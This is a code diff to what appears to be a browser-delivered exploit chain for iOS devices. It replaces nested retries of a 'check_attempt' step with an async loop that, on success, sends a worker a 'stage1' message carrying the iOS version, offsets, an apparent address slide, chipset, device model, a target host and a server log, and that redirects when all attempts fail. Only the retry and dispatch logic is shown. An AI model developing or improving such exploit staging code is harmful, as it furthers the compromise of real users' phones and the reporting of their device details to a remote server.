@@ -343,76 +343,17 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
             {
                 print("Starting check_attempt (iOS 18.4 path)");
         var attempt = new check_attempt();
-        attempt.start().then((result) => {
-            if(!result)
-            {
-               // print("Retrying");
-                attempt.start().then((result) => {
-                    if(!result)
-                    {
-                        attempt.start().then((result) => {
-                            if(!result)
-                            {
-                                attempt.start().then((result) => {
-                                    if(!result)
-                                    {
-                                        attempt.start().then((result) => {
-                                            if(!result)
-                                               print("");
-                                            else
-                                            {
-                                                worker.postMessage({
-                                                type: 'stage1',
-                                                begin,
-                                                origin,
-                                                ios_version,
-                                                offsets,
-                                                slide,
-                                                chipset,
-                                                device_model,
-                                                desiredHost,
-                                                SERVER_LOG
-                                                });
-                                            }
-                                        });
-                                    }
-                                    else
-                                    {
-                                        worker.postMessage({
-                                        type: 'stage1',
-                                        begin,
-                                        origin,
-                                        ios_version,
-                                        offsets,
-                                        slide,
-                                        chipset,
-                                        device_model,
-                                        desiredHost,
-                                        SERVER_LOG
-                                        });
-                                    }
-                                });
-                            }
-                            else
-                            {
-                                worker.postMessage({
-                                type: 'stage1',
-                                begin,
-                                origin,
-                                ios_version,
-                                offsets,
-                                slide,
-                                chipset,
-                                device_model,
-                                desiredHost,
-                                SERVER_LOG
-                                });
-                            }
-                        });
-                    }
-                    else
-                            {
-                        worker.postMessage({
+        (async function() {
+            var maxRetries = 5;
+            for (var retryIdx = 0; retryIdx < maxRetries; retryIdx++) {
+                if (retryIdx > 0) {
+                    print("check_attempt retry " + retryIdx + "/" + maxRetries);
+                    await new Promise(function(r) { setTimeout(r, 100); });
+                }
+                var result = false;
+                try { result = await attempt.start(); } catch(e) { print("check_attempt threw: " + e); }
+                if (result) {
+                    worker.postMessage({
                         type: 'stage1',
                         begin,
                         origin,
@@ -423,27 +364,13 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                         device_model,
                         desiredHost,
                         SERVER_LOG
-                });
-                            }
-                        });
-                    }
-                    else
-                    {
-                        //WebViewComptability(attempt, iframe);
-            worker.postMessage({
-                type: 'stage1',
-                begin,
-                origin,
-                ios_version,
-                offsets,
-                slide,
-                chipset,
-                device_model,
-                desiredHost,
-                SERVER_LOG
-            });
-                    }
-        });
+                    });
+                    return;
+                }
+            }
+            print("All " + maxRetries + " check_attempt retries exhausted", true);
+            redirect();
+        })();
             }
         }
         catch(e)
